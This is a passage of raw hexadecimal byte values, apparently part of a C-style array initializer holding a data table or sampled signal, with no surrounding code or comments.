0x1D, 0x1E, 0x1E, 0x1E, 0x0F, 0x1E, 0x1E, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x07, 0x07, 0x07, 0x07, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x18,
0x18, 0x17, 0x17, 0x9E, 0x9F, 0x9F, 0x9F, 0x9F, 0x08, 0x9E, 0x17, 0x18, 0x18, 0x18, 0x18, 0x18,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17, 0x17,
0x17, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17, 0x17, 0x17, 0x17, 0x18, 0x18, 0x18,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18,
0x17, 0x17, 0x17, 0x9C, 0x17, 0x18, 0x18, 0x18, 0x17, 0x17, 0x9C, 0x17, 0x18, 0x19, 0x19, 0x19,
0x19, 0x19, 0x18, 0x18, 0x18, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19,
0x19, 0x19, 0x19, 0x19, 0x19, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x19, 0x19, 0x19, 0x19, 0x19,
0x19, 0x19, 0x19, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x19, 0x19, 0x19, 0x19, 0x19,
0x19, 0x18, 0x18, 0x18, 0x18, 0x19, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x19, 0x18, 0x9C, 0x9F,
0x08, 0x9F, 0x18, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D,
0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1C, 0x1B, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x19, 0x07, 0x07, 0x19, 0x19, 0x19, 0x19, 0x19, 0x07, 0x07, 0x07, 0x07, 0x07,
0x19, 0x18, 0x17, 0x9D, 0x9D, 0x17, 0x18, 0x18, 0x18, 0x18, 0x18, 0x19, 0x19, 0x19, 0x19, 0x19,
0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x18, 0x17, 0x17, 0x17, 0x18, 0x18, 0x18, 0x17, 0x17,
0x17, 0x17, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17, 0x17, 0x18, 0x18, 0x18, 0x18, 0x17, 0x17,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x19, 0x19, 0x19, 0x19, 0x19, 0x18,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x19, 0x18, 0x18,
0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19,
0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x19, 0x19, 0x19, 0x07,
0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x19,
0x17, 0x9E, 0x14, 0xA0, 0x9D, 0x18, 0x18, 0x19, 0x19, 0x07, 0x07, 0x1B, 0x07, 0x07, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1D, 0x1E, 0x1E, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1C, 0x1C, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D,
0x1D, 0x1E, 0x1E, 0x07, 0x07, 0x07, 0x07, 0x19, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
0x18, 0x9C, 0x9C, 0x18, 0x18, 0x19, 0x19, 0x19, 0x19, 0x07, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19,
0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x19, 0x19, 0x19,
0x19, 0x18, 0x19, 0x19, 0x19, 0x19, 0x19, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19,
0x19, 0x19, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17, 0x17, 0x17, 0x17, 0x18, 0x18, 0x18, 0x18, 0x18,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x19, 0x19, 0x19, 0x19, 0x07, 0x07,
0x07, 0x07, 0x07, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x07, 0x07, 0x07, 0x19, 0x18, 0x18, 0x17,
0x18, 0x18, 0x19, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x19, 0x19, 0x19, 0x07, 0x07,
0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x07,
0x19, 0x18, 0xA1, 0xA0, 0x9F, 0x16, 0x17, 0x16, 0x16, 0x9E, 0x9E, 0x9E, 0x17, 0x18, 0x07, 0x1B,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D,
0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C,
0x1D, 0x1D, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1E, 0x1E, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x07, 0x07, 0x07, 0x19, 0x19, 0x19, 0x19, 0x19, 0x07, 0x07, 0x07, 0x07, 0x07,
0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x19, 0x19, 0x19, 0x19,
0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x18, 0x18, 0x18, 0x18, 0x18, 0x19, 0x19, 0x19,
0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18,
0x18, 0x18, 0x18, 0x18, 0x18, 0x19, 0x19, 0x19, 0x19, 0x19, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18,
0x18, 0x18, 0x19, 0x19, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x19,
0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x07, 0x07, 0x07, 0x07,
0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x1B, 0x07, 0x19,
0x18, 0x18, 0x18, 0x19, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x1B,
0x07, 0x07, 0x07, 0x19, 0x18, 0x17, 0x9E, 0x9E, 0x9E, 0x9E, 0x9F, 0x9E, 0x18, 0x07, 0x19, 0x18,
0x17, 0x17, 0x17, 0xA3, 0xA1, 0xA2, 0x9F, 0x9F, 0x9F, 0x9E, 0x16, 0x17, 0x16, 0x9F, 0x9F, 0x9E,
0x9D, 0x18, 0x19, 0x07, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D,
0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1E, 0x1E, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1E,
0x1D, 0x1D, 0x1D, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x1B,
0x1B, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x19, 0x19,
0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x18, 0x18, 0x17, 0x9C, 0x17,
0x18, 0x19, 0x19, 0x19, 0x07, 0x07, 0x07, 0x07, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19,
0x19, 0x19, 0x19, 0x07, 0x07, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19,
0x18, 0x18, 0x19, 0x19, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x19, 0x19, 0x19, 0x07, 0x07,
0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x19, 0x19, 0x19, 0x19, 0x07, 0x07, 0x07,
0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x19, 0x17, 0x9D, 0x08, 0x14, 0x14, 0x14, 0xA0, 0x17, 0x18, 0x18,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17, 0x17, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18,
0x19, 0x19, 0x07, 0x07, 0x07, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x19, 0x17, 0x17, 0x9A, 0x9A, 0x18, 0x07, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1C, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B,
0x1C, 0x1D, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1C, 0x1C, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E,
0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1C, 0x1B, 0x1B, 0x1C, 0x1C,
0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1C, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1B, 0x1B, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x1B,
0x1B, 0x1B, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x19, 0x19,
0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19,
0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19,
0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x18, 0x18,
0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x19, 0x19, 0x19, 0x19, 0x07, 0x07,
0x07, 0x07, 0x07, 0x19, 0x07, 0x07, 0x07, 0x07, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x07,
0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1B, 0x1B, 0x07, 0x19, 0x19, 0x19, 0x07, 0x07, 0x07,
0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x1C, 0x1C, 0x1B, 0x19, 0x19, 0x1B, 0x1C, 0x1C,
0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1B, 0x1B, 0x1B, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D,
0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x1B,
0x1B, 0x1B, 0x07, 0x19, 0x18, 0x18, 0x19, 0x19, 0x19, 0x19, 0x19, 0x18, 0x18, 0x18, 0x19, 0x19,
0x19, 0x19, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
0x07, 0x07, 0x07, 0x07, 0x07, 0x19, 0x19, 0x19, 0x19, 0x07, 0x07, 0x07, 0x07, 0x19, 0x19, 0x19,
0x07, 0x07, 0x07, 0x07, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x07, 0x07, 0x19, 0x19, 0x19,
0x19, 0x18, 0x18, 0x18, 0x19, 0x18, 0x18, 0x18, 0x18, 0x18, 0x19, 0x19, 0x19, 0x19, 0x19, 0x07,
0x07, 0x07, 0x07, 0x19, 0x19, 0x07, 0x07, 0x07, 0x07, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19,
0x19, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1B, 0x1B, 0x1B,
0x1B, 0x07, 0x07, 0x07, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D,
0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x07, 0x07, 0x07, 0x1B, 0x1C, 0x1C,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D,
0x1D, 0x1D, 0x1D, 0x1E, 0x1D, 0x1D, 0x1C, 0x1D, 0x1D, 0x1E, 0x1E, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C,
0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1C, 0x1D, 0x1D,
0x1D, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1E, 0x1E, 0x1D,
0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x07, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x07, 0x07, 0x19, 0x18, 0x18, 0x19, 0x19, 0x18, 0x17, 0x9D, 0x9F, 0x9E, 0x17, 0x19, 0x19,
0x19, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
0x07, 0x19, 0x18, 0x18, 0x18, 0x19, 0x19, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x19, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
0x07, 0x07, 0x07, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x18, 0x18, 0x19, 0x19, 0x19, 0x19, 0x19,
0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x07, 0x19, 0x07, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x07,
0x07, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x07,
0x07, 0x07, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B,
0x1B, 0x1B, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x07,
0x07, 0x07, 0x07, 0x07, 0x1B, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x07, 0x07, 0x19, 0x19, 0x19, 0x07, 0x1B, 0x1B, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1E, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1D, 0x1D,
0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x07, 0x07, 0x07, 0x07,
0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x19, 0x19, 0x18, 0x18, 0x17, 0x9D, 0x9C, 0x9D,
0x9D, 0x9C, 0x17, 0x18, 0x19, 0x19, 0x19, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
0x07, 0x07, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
0x07, 0x07, 0x07, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x19, 0x07,
0x07, 0x07, 0x07, 0x07, 0x07, 0x1B, 0x1B, 0x07, 0x1B, 0x1B, 0x07, 0x07, 0x07, 0x07, 0x07, 0x07,
